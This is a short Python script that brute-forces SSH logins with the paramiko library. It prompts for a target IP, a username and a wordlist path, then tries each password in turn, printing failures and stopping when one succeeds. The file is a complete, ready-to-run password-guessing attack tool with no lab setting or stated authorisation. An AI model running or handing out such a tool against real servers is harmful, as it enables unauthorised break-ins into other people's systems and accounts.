import paramiko
import time

def brute(Username, wordlist, target):
    with open(wordlist, "r", encoding='utf-8', errors="ignore") as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, username=Username, password=password, timeout=5)
            print(f"Password found: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except paramiko.SSHException:
            print(f"SSH error on {password} - retrying")
            time.sleep(1)
        except Exception:
            pass
        time.sleep(0.5)

target = input("Enter target IP: ")
username = input("Enter username: ")
wordlist = input("Enter wordlist path: ")

brute(username, wordlist, target)